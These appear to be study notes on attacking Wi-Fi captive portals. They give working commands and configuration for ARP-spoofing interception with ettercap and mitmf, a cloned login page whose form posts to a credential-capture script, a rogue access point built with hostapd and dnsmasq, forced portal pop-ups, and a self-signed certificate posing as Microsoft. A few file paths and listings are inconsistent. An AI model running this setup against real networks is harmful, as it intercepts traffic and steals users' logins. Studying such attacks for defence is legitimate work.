## Captive Portals

- Captive portals usually refer to open wifi networks.
- Widely used in hotels, airports, coffee shops ….etc
- Allow users to access the internet after logging in.
- Users login using a web interface.

  
## Bypassing Captive Portals

Captive portals can be bypassed using various methods depending on how they are implemented:

1. Change your MAC address to match that of a connected client.
2. Use monitor mode to sniff login credentials.
3. Connect to the network and execute an ARP spoofing attack to capture credentials.
4. Create a fake access point (AP) and trick users into logging in.


### 2. Sniffing Credentials in Monitor Mode

* Captive portals are typically open networks.
* This means they do **not** use encryption (e.g., WPA/WPA2).
* Use `airodump-ng` to capture traffic in monitor mode.
* Then analyze the captured packets using **Wireshark** to extract credentials such as usernames and passwords.


### 3. Sniffing Credentials Using ARP Spoofing

* Open networks allow connection without a password.
* After connecting, a typical ARP spoofing attack can be performed.

Expected behavior:

* Connected clients may lose their session and be prompted to log in again.
* All data transmitted between clients and the router (including credentials) can be intercepted.

Commands:

``` bash
sudo ettercap -Tq -M arp:remote -i wlan0 ///
```
Each target is placed between two slashes: <br>
/TARGET1/ /TARGET2/ — intercept traffic between TARGET1 and TARGET2. <br>
/// — intercept all traffic on the network (no specific targets).

/// it  means:

- No specific targets.
- ARP poison the entire subnet.
- Perform a full man-in-the-middle attack on all devices on the LAN.

Or:
``` bash
mitmf --arp --spoof -i wlan0 --gateway [gateway]

# For finding gateway: route -n
```

## Modifying the HTML Code

Once you've saved and moved the captive portal login page into `/var/www/html`, and renamed the main file as `index.html`, you'll need to **edit the HTML** to ensure it works correctly when served locally and can capture user credentials effectively.

### 1. Fix Relative Paths

* In many saved HTML pages, paths to images, stylesheets, or scripts may be written as:

  ```html
  href="asset/image"
  ```

* These will **not resolve correctly** unless they're changed to reference the correct root-relative path.

* **Modify them like this:**

  ```html
  href="/asset/image"
  ```

* This applies to:

  * `<link href=...>` for stylesheets
  * `<script src=...>` for JavaScript
  * `<img src=...>` for images

### 2. Ensure Username and Password Fields Are Inside a `<form>` Tag

* Often, login forms may contain username and password fields (`<input type="text">`, `<input type="password">`) **without being wrapped in a `<form>` tag**, especially in JavaScript-heavy or AJAX-based login pages.

* To capture credentials effectively (e.g., using a PHP script or MITM framework), it's important to wrap these fields inside a standard HTML `<form>` element.

* **Example of a corrected structure:**

  ```html
  <form action="capture.php" method="POST">
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Login</button>
  </form>
  ```

* This allows the credentials to be easily submitted to your server-side script for logging or redirection.

### 3. Check the Submit Button

* Make sure the **submit button** inside the form is properly defined:

  ```html
  <button type="submit">Login</button>
  ```

  Or:

  ```html
  <input type="submit" value="Login">
  ```

* If it's just a `<div>` or `<a>` element styled to look like a button, it won't submit the form unless JavaScript is present. Replace or modify it accordingly.

## 📡 `hostapd` + `dnsmasq` – Wi-Fi Testing Setup Notes


## 🔧 What Is `hostapd`?

**hostapd** = *Host Access Point Daemon*

### 🧠 Purpose:

* Turns your Wi-Fi adapter into a **wireless access point (AP)**
* Broadcasts SSID and handles client authentication (WPA2/WPA3)
* Core component in creating custom Wi-Fi networks (rogue or test)

### 🧪 Basic `hostapd.conf` Example:

```conf
interface=wlan0
driver=nl80211
ssid=FreeWifi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=hacktheplanet
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

---

## 🧠 What Is `dnsmasq`?

**dnsmasq** = Lightweight DNS + DHCP server

### 🔍 Purpose:

* Assigns IP addresses to clients that connect to your AP (DHCP)
* Resolves domain names to IP addresses (DNS)
* Optionally can redirect DNS to a local server (for captive portals, phishing, etc.)

### 🧪 Basic `dnsmasq.conf` Example:

```conf
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
```

## Captive Portal Auto-Popup — Concept Notes

### 🎯 Goal

Make the fake (lab) access point behave like a *real captive portal* so that when a device connects,
the login page appears **automatically**, without users opening a browser first.

## 🧩 Why it didn’t show automatically

* When devices connect to Wi-Fi, their OS checks for internet access by visiting a known test URL.

  * Windows, macOS, iOS, Android → each use different URLs.
* If the server replies *normally*, the OS assumes full internet access → no popup.
* If the reply is *unexpected*, the OS assumes it’s a captive portal → opens the login page.
* The fake access point redirected traffic, but **Apache didn’t handle “[www.”](http://www.”) hostnames** correctly
  (`www.example.com` vs `example.com`).
  → So the OS got an unexpected response → no popup.

---

## ⚙️ Fix step 1 — Handle `www.` hostnames

* Edit Apache’s config file:
  `/etc/apache2/sites-enabled/000-default.conf`
* Add a `<Directory>` block pointing to the website root (e.g., `/var/www/html`).
* Inside it, add **rewrite rules** to remove `www.` from any incoming hostname.

#### Add inside the config file:
```bash
<Directory "/var/www/html">
    RewriteEngine On
    RewriteBase /

    # Redirect any request starting with "www." to the same domain without it
    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

    # If requested file or directory doesn’t exist,
    # redirect the user to the root (homepage / fake login page)
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ / [L,QSA]
</Directory>

```

  * These rules use **mod_rewrite** (regex) to match `www.` and rewrite it to the same domain without it.
    
* Add an extra rewrite rule so *any* missing file redirects to `/`.
    → Helps especially with mobile devices (iPhones, Android).

* Restart Apache after saving.

✅ **Effect:** Windows now detects the portal and auto-opens the login screen.
✅ **Effect:** Any unexpected path still lands on the portal homepage.

---

## ⚙️ Fix step 2 — Handle “Not Found” (404) errors

* Windows tried to access random paths after the domain name (e.g., `/some/path/on/microsoft.com`).
* Since those files didn’t exist → Apache returned a 404 → blank page.
* To fix:

  * Add an error handler:

    ```
    ErrorDocument 404 /
    ```
→ Sends all 404 errors back to the homepage (where the fake login page lives).

### 📱 Result

* Now, when users connect:

  * Browser automatically opens the captive-portal login window.
  * OS shows a “Sign in to network” message or bar (like real Wi-Fi).
  * All devices (Windows, macOS, smartphones) see the fake login page automatically.
* HTTPS sites (like Facebook) still fail with “secure connection error” because captive portals can’t intercept HTTPS traffic easily — that’s addressed in the next part.

## 🧠 Generating Fake SSL Certificate

### 🎯 Goal

Enable **HTTPS (SSL/TLS)** on Apache so browsers no longer show “Secure connection failed” when connecting to the fake/lab captive portal.

---

## 🧩 Problem

* Currently, the captive portal only uses **HTTP**.
* When users try to open HTTPS websites (Facebook, Google, etc.), browsers block the page because the server doesn’t support HTTPS.
* To make it look realistic, Apache must support HTTPS by having its own SSL/TLS certificate.

---

## ⚙️ Step 1 — Generate a Self-Signed SSL Certificate

### 🧰 Tool

Use **OpenSSL** to create the certificate and private key.

### 💻 Command breakdown

```bash
sudo openssl req -new -x509 -days 365 -keyout /home/kali/Downloads/fake-ap/cert.key -out /home/kali/Downloads/fake-ap/cert.pem
```

### 🧱 Explanation

* `openssl req` → starts the certificate creation process.
* `-x509` → makes a self-signed certificate (used for testing).
* `-days 365` → certificate valid for one year.
* `-keyout` → where to save the private key file.
* `-out` → where to save the certificate file (`.pem`).

You’ll be asked to enter:

* A **passphrase** (invisible as you type).
* Basic info (country, state, organization, domain name, email).

✅ Example values:

```
Country: IE
State: Dublin
Org: Microsoft
Unit: Networking
Common Name: royal (Wi-Fi name)
Email: info@microsoft.com
```

After this, two files will exist (in `/root/Downloads/fakeAP/`):

```

cert.key  → the private key
```

# 🧠 Enabling HTTPS (SSL/TLS) on Apache Webserver

## ⚙️ Step 1 — Enable SSL module in Apache

```bash
sudo a2enmod ssl
```

* This command activates Apache’s SSL/TLS module.
* If it says *already enabled*, you’re good.

---

## ⚙️ Step 2 — Configure SSL virtual host

### 📄 File to edit

`/etc/apache2/sites-enabled/000-default.conf`

### 🧱 Add a new virtual host for HTTPS

Inside that file, duplicate the existing HTTP `<VirtualHost *:80>` block and change it to:

```apache
<VirtualHost *:443>
    DocumentRoot /var/www/html

    SSLEngine on
    SSLCertificateFile /home/kali/Downloads/fake-ap/cert.pem
    SSLCertificateKeyFile /home/kali/Downloads/fake-ap/cert.key
</VirtualHost>
```

### 📝 Explanation

* `*:443` → standard HTTPS port.
* `SSLEngine on` → enables SSL/TLS.
* `SSLCertificateFile` → path to your certificate (`.pem`).
* `SSLCertificateKeyFile` → path to your private key (`.key`).

✅ Double-check file names and paths — Apache will fail to start if they’re wrong.

---

## ⚙️ Step 3 — Ensure Apache listens on port 443

Edit `/etc/apache2/ports.conf`
and verify:

```apache
Listen 80
Listen 443
```

## ⚙️ Step 4 — Restart Apache

```bash
sudo service apache2 restart
```

* If prompted for a passphrase → enter the one you set when creating the cert.
* If it fails, recheck the certificate file names or paths.
